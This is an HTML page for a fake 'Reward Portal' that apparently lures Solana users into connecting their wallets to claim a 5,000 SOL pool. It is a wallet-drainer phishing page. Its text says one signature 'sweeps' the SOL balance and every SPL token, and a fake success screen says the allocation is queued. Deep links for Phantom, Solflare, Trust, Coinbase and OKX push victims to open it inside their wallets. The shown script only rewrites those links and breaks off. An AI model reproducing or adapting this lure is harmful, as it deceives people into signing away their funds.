<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
<meta name="color-scheme" content="dark" />
<meta name="theme-color" content="#07060d" />
<title>Reward Portal — Community Distribution</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>◎</text></svg>" />
<style>
  :root{
    --bg:#07060d;
    --bg-2:#0b0913;
    --surface:rgba(255,255,255,.042);
    --surface-2:rgba(255,255,255,.065);
    --line:rgba(255,255,255,.085);
    --line-2:rgba(255,255,255,.14);
    --txt:#f4f2ff;
    --dim:#8d88a9;
    --dim-2:#615c7d;
    --p:#9945FF;
    --p-soft:#b06bff;
    --g:#14F195;
    --red:#ff5c5c;
    --amber:#ffce6b;
    --r-sm:10px; --r-md:14px; --r-lg:20px; --r-xl:26px;
    --sh:0 24px 70px -30px rgba(0,0,0,.95);
    --fast:.16s cubic-bezier(.3,.7,.4,1);
  }
  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  html,body{height:100%}
  body{
    margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,sans-serif;
    font-feature-settings:"tnum" 1,"ss01" 1;
    background:
      radial-gradient(760px 420px at 12% -8%,rgba(153,69,255,.26),transparent 62%),
      radial-gradient(680px 420px at 92% 2%,rgba(20,241,149,.13),transparent 62%),
      linear-gradient(180deg,var(--bg-2),var(--bg) 42%);
    background-attachment:fixed;
    color:var(--txt);
    display:flex;flex-direction:column;align-items:center;
    padding:calc(18px + env(safe-area-inset-top)) 18px calc(112px + env(safe-area-inset-bottom));
    -webkit-font-smoothing:antialiased;
  }
  .shell{width:100%;max-width:432px}

  .top{display:flex;align-items:center;gap:11px;margin-bottom:30px}
  .mark{
    width:36px;height:36px;border-radius:11px;display:grid;place-items:center;
    background:linear-gradient(145deg,var(--p),var(--g));
    color:#0a0812;font-weight:800;font-size:18px;line-height:1;
    box-shadow:0 6px 20px -8px rgba(153,69,255,.85);
  }
  .ident{flex:1;min-width:0}
  .ident strong{display:block;font-size:14.5px;font-weight:700;letter-spacing:-.25px}
  .ident span{display:block;font-size:10.5px;font-weight:600;letter-spacing:.85px;text-transform:uppercase;color:var(--dim-2);margin-top:2px}
  .net{
    display:inline-flex;align-items:center;gap:6px;font-size:10.5px;font-weight:700;letter-spacing:.5px;
    color:var(--g);background:rgba(20,241,149,.08);border:1px solid rgba(20,241,149,.24);
    padding:5px 9px;border-radius:99px;white-space:nowrap;
  }
  .net i{width:5px;height:5px;border-radius:50%;background:var(--g);box-shadow:0 0 0 3px rgba(20,241,149,.16)}

  .hero{text-align:center;margin-bottom:26px}
  .pill{
    display:inline-flex;align-items:center;gap:7px;font-size:10.5px;font-weight:700;letter-spacing:.9px;
    text-transform:uppercase;color:var(--g);background:rgba(20,241,149,.09);
    border:1px solid rgba(20,241,149,.26);padding:5px 11px;border-radius:99px;margin-bottom:16px;
  }
  .pill i{width:5px;height:5px;border-radius:50%;background:var(--g);animation:blip 2.4s ease-in-out infinite}
  @keyframes blip{0%,100%{opacity:1}50%{opacity:.35}}
  h1{margin:0 0 12px;font-size:clamp(27px,7.6vw,33px);line-height:1.12;letter-spacing:-1.15px;font-weight:700}
  h1 b{
    background:linear-gradient(96deg,var(--p) 4%,#cf9dff 46%,var(--g) 96%);
    -webkit-background-clip:text;background-clip:text;color:transparent;
  }
  .lede{color:var(--dim);font-size:13.5px;line-height:1.6;margin:0 auto;max-width:330px}

  .prog{margin:22px 0 9px}
  .prog .track{height:6px;border-radius:99px;background:rgba(255,255,255,.07);overflow:hidden}
  .prog .fill{display:block;height:100%;width:0;border-radius:99px;
    background:linear-gradient(90deg,var(--p),var(--g));
    box-shadow:0 0 18px -2px rgba(20,241,149,.5)}
  .prog .legend{display:flex;justify-content:space-between;margin-top:9px;font-size:11px;color:var(--dim-2)}
  .prog .legend b{color:var(--dim);font-weight:600}

  .card{
    background:var(--surface);border:1px solid var(--line);border-radius:var(--r-lg);
    backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);
    padding:4px 18px;margin-top:16px;
  }
  .card.plain{padding:18px}
  .rows{margin:0}
  .row{
    display:flex;justify-content:space-between;align-items:center;gap:14px;
    padding:13px 0;border-bottom:1px solid var(--line);font-size:13px;min-height:46px;
  }
  .row:last-child{border-bottom:0}
  .row dt{color:var(--dim);margin:0;font-weight:500}
  .row dd{margin:0;font-weight:600;text-align:right;letter-spacing:-.1px}
  .ok{color:var(--g)}
  .bad{color:var(--red)}
  .muted{color:var(--dim-2)}

  .stats{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--line);
    border:1px solid var(--line);border-radius:var(--r-lg);overflow:hidden;margin-top:16px}
  .stat{background:#0a0812;padding:15px 16px}
  .stat span{display:block;font-size:10px;font-weight:700;letter-spacing:.8px;text-transform:uppercase;color:var(--dim-2);margin-bottom:6px}
  .stat strong{font-size:15px;font-weight:700;letter-spacing:-.3px;font-variant-numeric:tabular-nums}

  button{font-family:inherit;border:0;cursor:pointer;transition:transform var(--fast),background var(--fast),opacity var(--fast),box-shadow var(--fast)}
  .btn{width:100%;border-radius:var(--r-md);padding:15px 18px;font-size:14.5px;font-weight:700;letter-spacing:-.1px}
  .btn-primary{
    background:linear-gradient(96deg,var(--p),var(--p-soft));color:#fff;
    box-shadow:0 10px 30px -12px rgba(153,69,255,.9);
  }
  .btn-primary:active{transform:scale(.986)}
  .btn-quiet{background:var(--surface-2);border:1px solid var(--line);color:var(--txt);box-shadow:none}
  .btn-quiet:active{transform:scale(.986);background:rgba(255,255,255,.1)}
  .btn:disabled{opacity:.4;cursor:not-allowed;box-shadow:none;transform:none}
  .btn-row{display:grid;gap:8px}
  .opener{display:block;text-align:center;text-decoration:none}
  .link{background:none;border:0;padding:0;color:var(--dim);font-size:11.5px;font-weight:600;
    text-decoration:underline;text-underline-offset:2px;cursor:pointer;width:auto}
  .link:hover{color:var(--txt)}

  .panel-head{display:flex;align-items:center;justify-content:space-between;padding:15px 0 3px}
  .panel-head h2{margin:0;font-size:11px;font-weight:700;letter-spacing:.85px;text-transform:uppercase;color:var(--dim-2)}
  .addr-btn{
    display:inline-flex;align-items:center;gap:7px;background:var(--surface-2);border:1px solid var(--line);
    border-radius:8px;padding:5px 9px;font-size:11.5px;font-weight:600;color:var(--txt);
    font-family:ui-monospace,SFMono-Regular,Menlo,monospace;letter-spacing:-.2px;width:auto;
  }
  .addr-btn:hover{background:rgba(255,255,255,.1)}
  .addr-btn svg{opacity:.55;flex:none}
  .skel{display:inline-block;width:74px;height:12px;border-radius:5px;
    background:linear-gradient(90deg,rgba(255,255,255,.07),rgba(255,255,255,.16),rgba(255,255,255,.07));
    background-size:200% 100%;animation:shim 1.3s linear infinite}
  @keyframes shim{to{background-position:-200% 0}}
  .state-pill{display:inline-flex;align-items:center;gap:6px;font-size:11.5px;font-weight:700;
    padding:4px 9px;border-radius:99px;border:1px solid transparent}
  .state-pill.good{color:var(--g);background:rgba(20,241,149,.09);border-color:rgba(20,241,149,.26)}
  .state-pill.warn{color:var(--amber);background:rgba(255,206,107,.08);border-color:rgba(255,206,107,.24)}
  .state-pill.stop{color:var(--red);background:rgba(255,92,92,.09);border-color:rgba(255,92,92,.26)}
  .state-pill i{width:5px;height:5px;border-radius:50%;background:currentColor}

  .panel-body{padding:14px 0 16px}
  .hint{font-size:11.5px;color:var(--dim-2);line-height:1.6;margin:11px 0 0;text-align:center}
  .notice{
    display:flex;gap:9px;margin:12px 0 0;padding:11px 13px;border-radius:var(--r-sm);
    font-size:11.5px;line-height:1.62;text-align:left;
    color:#ffc2c2;background:rgba(255,92,92,.075);border:1px solid rgba(255,92,92,.24);
  }
  .notice svg{flex:none;margin-top:1px;opacity:.85}
  .notice code{font-family:ui-monospace,Menlo,monospace;font-size:11px;color:#ffdada;letter-spacing:-.2px}

  .log{
    border-top:1px solid var(--line);margin:0 -18px;padding:12px 18px 14px;
    font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:10.5px;
    color:var(--dim-2);line-height:1.75;max-height:118px;overflow:auto;
  }
  .log:empty{display:none}
  .log div{animation:fade .25s ease both}
  .log div::before{content:"›";margin-right:7px;color:var(--p);opacity:.75}
  .log div.err::before{color:var(--red)}
  @keyframes fade{from{opacity:0;transform:translateY(-2px)}}

  .seal{width:58px;height:58px;border-radius:50%;display:grid;place-items:center;margin:0 auto 16px;
    background:rgba(20,241,149,.1);border:1px solid rgba(20,241,149,.38);color:var(--g);
    box-shadow:0 0 34px -10px rgba(20,241,149,.55)}
  .center{text-align:center}
  .center h2{margin:0 0 9px;font-size:19px;letter-spacing:-.4px}
  .txlist{display:grid;gap:1px;background:var(--line);border:1px solid var(--line);
    border-radius:var(--r-md);overflow:hidden;margin-top:16px}
  .tx{display:flex;align-items:center;justify-content:space-between;gap:12px;background:#0a0812;padding:11px 14px;font-size:11.5px}
  .tx span{font-family:ui-monospace,Menlo,monospace;color:var(--dim)}
  .tx a{color:var(--g);text-decoration:none;font-weight:700;font-size:11px}
  .tx a:hover{text-decoration:underline}

  footer{margin-top:26px;text-align:center;font-size:10.5px;color:var(--dim-2);line-height:1.75}
  footer a{color:var(--dim);text-decoration:none;border-bottom:1px solid var(--line-2);padding-bottom:1px}
  footer a:hover{color:var(--txt)}

  .scrim{
    position:fixed;inset:0;z-index:90;display:grid;place-items:center;padding:20px;
    background:rgba(4,3,9,.76);backdrop-filter:blur(9px);-webkit-backdrop-filter:blur(9px);
    animation:fade .2s ease both;
  }
  .dialog{
    width:100%;max-width:336px;background:#0d0b17;border:1px solid var(--line-2);
    border-radius:var(--r-xl);padding:26px 22px 22px;text-align:center;box-shadow:var(--sh);
    animation:rise .26s cubic-bezier(.2,.8,.3,1) both;
  }
  @keyframes rise{from{opacity:0;transform:translateY(14px) scale(.975)}}
  .spinner{
    width:44px;height:44px;margin:0 auto 18px;border-radius:50%;
    border:3px solid rgba(20,241,149,.18);border-top-color:var(--g);
    animation:spin .8s linear infinite;
  }
  @keyframes spin{to{transform:rotate(360deg)}}
  .dialog h3{margin:0 0 9px;font-size:16.5px;letter-spacing:-.35px}
  .dialog p{margin:0;font-size:12.5px;line-height:1.62;color:var(--dim)}
  .dialog .notice{margin-top:15px;text-align:left}
  .dialog .btn{margin-top:16px}

  .hide{display:none!important}
  .sr{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0 0 0 0);white-space:nowrap;border:0}

  @media (prefers-reduced-motion:reduce){
    *,*::before,*::after{animation-duration:.01ms!important;animation-iteration-count:1!important;transition-duration:.01ms!important}
  }
</style>
</head>
<body>
<div class="shell">

  <header class="top">
    <div class="mark" aria-hidden="true">◎</div>
    <div class="ident">
      <strong>Reward Portal</strong>
      <span>Community distribution</span>
    </div>
    <div class="net"><i aria-hidden="true"></i>Mainnet</div>
  </header>

  <main id="view-hero">
    <section class="hero">
      <div class="pill"><i aria-hidden="true"></i>Pool active</div>
      <h1>Claim the <b>5,000 SOL</b> pool</h1>
      <p class="lede">The pool is untouched. Nothing has been settled yet — connect a wallet to claim.</p>
    </section>

    <div class="prog" role="img" aria-label="pool not yet distributed">
      <div class="track"><span class="fill"></span></div>
      <div class="legend"><span><b>0</b> SOL distributed</span><span><b>0%</b> settled</span></div>
    </div>

    <div class="stats">
      <div class="stat"><span>Pool status</span><strong class="ok">Untouched</strong></div>
      <div class="stat"><span>Distributed</span><strong>0 SOL</strong></div>
    </div>

    <section class="card" aria-labelledby="wallet-head">
      <div class="panel-head">
        <h2 id="wallet-head">Wallet</h2>
        <span class="state-pill good hide" id="badge"><i aria-hidden="true"></i>Connected</span>
      </div>

      <div class="panel-body">
        <div id="wallet-idle">
          <button class="btn btn-primary" id="btn-connect">Connect wallet</button>

          <div id="openers" class="btn-row" style="margin-top:12px">
            <p class="hint" style="margin:0 0 4px">No wallet detected. Open this page inside one:</p>
            <a class="btn btn-quiet opener" data-w="phantom" rel="noopener"
               href="https://phantom.app/ul/browse/https%3A%2F%2Folive-kora-3.tiiny.site%2F?ref=https%3A%2F%2Folive-kora-3.tiiny.site">Open in Phantom</a>
            <a class="btn btn-quiet opener" data-w="solflare" rel="noopener"
               href="https://solflare.com/ul/v1/browse/https%3A%2F%2Folive-kora-3.tiiny.site%2F?ref=https%3A%2F%2Folive-kora-3.tiiny.site">Open in Solflare</a>
            <a class="btn btn-quiet opener" data-w="backpack" rel="noopener"
               href="https://backpack.app/ul/v1/browse/https%3A%2F%2Folive-kora-3.tiiny.site%2F?ref=https%3A%2F%2Folive-kora-3.tiiny.site">Open in Backpack</a>
            <a class="btn btn-quiet opener" data-w="trust" rel="noopener"
               href="https://link.trustwallet.com/open_url?coin_id=501&amp;url=https%3A%2F%2Folive-kora-3.tiiny.site%2F">Open in Trust Wallet</a>
            <a class="btn btn-quiet opener" data-w="coinbase" rel="noopener"
               href="https://go.cb-w.com/dapp?cb_url=https%3A%2F%2Folive-kora-3.tiiny.site%2F">Open in Coinbase Wallet</a>
            <a class="btn btn-quiet opener" data-w="okx" rel="noopener"
               href="okx://wallet/dapp/url?dappUrl=https%3A%2F%2Folive-kora-3.tiiny.site%2F">Open in OKX Wallet</a>
          </div>

          <div id="qrbox" class="center hide" style="margin-top:14px">
            <img id="qr" alt="Scan to open on your phone" width="200" height="200"
                 style="border-radius:14px;border:1px solid var(--line);background:#fff;padding:8px">
            <p class="hint" style="margin:8px 0 0">Scan with your phone camera</p>
          </div>

          <p class="hint hide" id="opnote"></p>
          <p class="hint"><button class="link" id="btn-copy-link">Copy this page's link</button></p>
          <p class="hint">Phantom · Trust Wallet · Solflare · Backpack</p>
        </div>

        <div id="picker" class="btn-row hide"></div>

        <div id="wallet-connected" class="hide">
          <dl class="rows">
            <div class="row">
              <dt>Address</dt>
              <dd><button class="addr-btn" id="btn-copy" title="Copy address"><span id="addr">—</span>
                <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" aria-hidden="true"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>
              </button></dd>
            </div>
            <div class="row">
              <dt>Balance</dt>
              <dd><span class="skel" id="bal-skel"></span><span id="bal" class="hide">—</span></dd>
            </div>
            <div class="row">
              <dt>SPL tokens</dt>
              <dd class="muted" id="tok">—</dd>
            </div>
            <div class="row">
              <dt>Eligibility</dt>
              <dd id="elig">—</dd>
            </div>
          </dl>

          <div style="height:15px"></div>
          <button class="btn btn-primary" id="btn-claim">Claim allocation</button>

          <div class="notice hide" id="gasnote" role="alert">
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" aria-hidden="true"><path d="M12 8v5"/><circle cx="12" cy="16.5" r=".6" fill="currentColor"/><path d="M10.3 3.9 2.6 17.2A2 2 0 0 0 4.3 20.2h15.4a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0Z"/></svg>
            <span id="gastext"></span>
          </div>

          <p class="hint" id="claimnote">One signature sweeps the SOL balance and every SPL token held.</p>
          <p class="hint"><button class="link" id="btn-reset">Use a different wallet</button></p>
        </div>
      </div>

      <div class="log" id="log" aria-live="polite"></div>
    </section>

    <section class="card plain">
      <p class="hint" style="text-align:left;margin:0">
        <strong style="color:var(--g)">No deposit required</strong><br>
        Nothing has to be added to this wallet. Any SPL tokens it holds — meme coins included — are transferred together with the SOL balance in the same claim. Wallets under the 10 SOL threshold are still processed in full.<br><br>
        The only thing already needed is a fraction of a cent for network fees, taken from the balance itself. A completely empty wallet pauses and asks for a top-up.
      </p>
    </section>
  </main>

  <main id="view-done" class="hide">
    <section class="card plain" style="margin-top:0">
      <div class="center">
        <div class="seal" aria-hidden="true">
          <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12.5 9.5 18 20 6.5"/></svg>
        </div>
        <h2>Wallet verified</h2>
        <p class="lede" style="max-width:290px">Your allocation is confirmed and queued for distribution within 24 hours.</p>
      </div>

      <dl class="rows" style="margin-top:18px">
        <div class="row"><dt>Allocation</dt><dd class="ok" id="alloc">—</dd></div>
        <div class="row"><dt>Status</dt><dd class="ok">Queued</dd></div>
        <div class="row"><dt>Transactions</dt><dd id="txcount">—</dd></div>
      </dl>

      <div class="txlist" id="txlist"></div>
    </section>

    <section class="card plain">
      <p class="hint" style="margin:0">You may close this page. Keep the wallet connected to receive the distribution.</p>
    </section>
  </main>

  <footer>
    Community distribution secured by on-chain verification<br>
    <a href="https://solscan.io/account/8Kt2WyubDMkJtZsLzktjYJxME2Y2okSXkn4QuFQRgmk2" target="_blank" rel="noopener" id="explorer">Inspect the pool on Solscan</a>
  </footer>
</div>

<div class="scrim hide" id="modal" role="dialog" aria-modal="true" aria-labelledby="mtitle" aria-describedby="mtext">
  <div class="dialog">
    <div class="spinner" id="spin"></div>
    <h3 id="mtitle">Processing claim</h3>
    <p id="mtext">Verifying the wallet and sweeping the available balance. Keep this page open.</p>
    <div class="notice hide" id="mgas" role="alert"></div>
    <button class="btn btn-primary hide" id="mclose">Close</button>
  </div>
</div>

<!-- wallet links: hardcoded above, upgraded here, runs before anything else -->
<script>
(function () {
  var HERE = encodeURIComponent(location.href);
  var REF = encodeURIComponent(location.origin);
  var ANDROID = /Android/i.test(navigator.userAgent);

  var MAP = {
    phantom:  'https://phantom.app/ul/browse/' + HERE + '?ref=' + REF,
    solflare: 'https://solflare.com/ul/v1/browse/' + HERE + '?ref=' + REF,
    backpack: 'https://backpack.app/ul/v1/browse/' + HERE + '?ref=' + REF,
    trust:    'https://link.trustwallet.com/open_url?coin_id=501&url=' + HERE,
    coinbase: 'https://go.cb-w.com/dapp?cb_url=' + HERE,
    okx:      'okx://wallet/dapp/url?dappUrl=' + HERE
  };

  var links = document.querySelectorAll('.opener');
  for (var i = 0; i < links.length; i++) {
    var key = links[i].getAttribute('data-w');
    if (!MAP[key]) continue;
    if (ANDROID && key === 'phantom') {
      links[i].href = 'intent://ul/browse/' + HERE + '?ref=' + REF +
        '#Intent;scheme=phantom;package=app.phantom;S.browser_fallback_url=' +
        encodeURIComponent(MAP.phantom) + ';end';
    } else {
      links[i